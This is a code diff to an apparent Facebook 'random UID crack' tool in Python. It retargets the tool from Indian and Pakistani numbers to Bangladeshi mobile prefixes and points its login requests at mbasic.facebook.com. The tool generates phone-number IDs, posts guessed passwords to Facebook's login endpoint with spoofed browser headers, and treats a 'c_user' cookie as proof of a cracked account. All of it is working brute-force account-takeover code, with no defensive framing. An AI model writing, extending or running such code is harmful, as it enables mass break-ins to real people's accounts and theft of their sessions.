@@ -170,8 +170,8 @@ def random_crack():
 	os.system('clear')
 	print(logo)
 	print(47*"-")
-	print('[1] India Random Uid Crack')
-	print('[2] Pak Random Uid Crack')
+	print('[1] BD Random Uid Crack')
+	print('[2] BD Random Uid Crack')
 	print('[0] Back')
 	print(47*'-')
 	opt = input('[?] Choose : ')
@@ -189,7 +189,7 @@ def random_number():
 	os.system('clear')
 	print(logo)
 	print(47*"-")
-	print('[+] For Indian Enter Four Digit Code (9934)')
+	print('[+] For BD Enter THREE Digit Code (017,019,018,016)')
 	print(47*'-')
 	kode = input('[?] Input Code : ')
 	print(47*'-')
@@ -236,7 +236,7 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -250,7 +250,7 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
@@ -325,7 +325,7 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.facebook.com',
+			header_freefb = {'authority':'mbasic.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -339,7 +339,7 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro}
-			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
